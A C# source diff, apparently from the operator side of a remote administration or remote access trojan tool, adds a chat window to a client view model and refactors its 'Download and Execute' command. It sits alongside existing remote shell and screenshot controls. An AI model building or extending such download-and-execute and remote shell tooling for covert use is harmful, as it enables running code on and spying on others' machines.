@@ -19,12 +19,14 @@
         private ComputerInfo computerInfo;
         private RemoteShellPresenter remoteShellPresenter;
         private ScreenshotPresenter screenShotPresenter;
+        private ChatPresenter chatPresenter;
 
         private int id;
         private bool canScreenshot;
         private bool canDisconnect;
         private bool canDownload;
         private bool canRemoteShell;
+        private bool canChat;
 
 
         public ClientViewModel(ClientSocket clientSocket)
@@ -45,6 +47,7 @@
         public bool CanDisconnect { get { return this.canDisconnect; } set { this.canDisconnect = value; NotifyPropertyChanged("CanDisconnect"); } }
         public bool CanDownload { get { return this.canDownload; } set { this.canDownload = value; NotifyPropertyChanged("CanDownload"); } }
         public bool CanRemoteShell { get { return this.canRemoteShell; } set { this.canRemoteShell = value; NotifyPropertyChanged("CanRemoteShell"); } }
+        public bool CanChat { get { return this.canChat; } set { this.canChat = value; NotifyPropertyChanged("CanChat"); } }
         public string UserPath { get { return this.GenerateUserPath(); } }
         public string OutTraffic { get { return this.GetFancyTrafficName(this.clientSocket.OutTraffic); } }
         public string InTraffic { get { return this.GetFancyTrafficName(this.clientSocket.InTraffic); } }
@@ -54,6 +57,7 @@
         public ICommand CmdScreenshot { get; private set; }
         public ICommand CmdDownloadExecute { get; private set; }
         public ICommand CmdRemoteShell { get; private set; }
+        public ICommand CmdChat { get; private set; }
 
         private void Init()
         {
@@ -65,11 +69,13 @@
 
             this.remoteShellPresenter = new RemoteShellPresenter(this);
             this.screenShotPresenter = new ScreenshotPresenter(this);
+            this.chatPresenter = new ChatPresenter(this);
 
             this.CmdDisconnect = new CommandHandler(() => this.Disconnect(), this.CanDisconnect);
             this.CmdScreenshot = new CommandHandler(() => this.Screenshot(), this.CanScreenshot);
             this.CmdDownloadExecute = new CommandHandler(() => this.DownloadExecute(), this.CanDownload);
             this.CmdRemoteShell = new CommandHandler(() => this.RemoteShell(), this.CanRemoteShell);
+            this.CmdChat = new CommandHandler(() => this.Chat(), this.CanChat);
         }
 
         private string GetFancyTrafficName(Int64 traffic)
@@ -124,10 +130,9 @@
 
         private void DownloadExecute()
         {
-            string url = TextInputWindow.ShowWindow("Download and Execute", "URL to download:");
-            if (!string.IsNullOrEmpty(url))
+            string downloadExec = TextInputWindow.ShowWindow("Download and Execute", "URL to download:");
+            if (!string.IsNullOrEmpty(downloadExec))
             {
-                DownloadExec downloadExec = new DownloadExec(url);
                 this.clientSocket.SendObject(PacketId.DOWNLOAD_AND_EXECUTE, downloadExec);
             }
         }
@@ -142,6 +147,16 @@
         public void UpdateRemoteShellOutput(string output)
         {
             this.remoteShellPresenter.UpdateOutput(output);
+        }
+
+        private void Chat()
+        {
+            this.chatPresenter.Show();
+        }
+
+        public void UpdateChat(string message)
+        {
+            this.chatPresenter.Update(message);
         }
 
         public void SendObject(short packetId, object myClass)
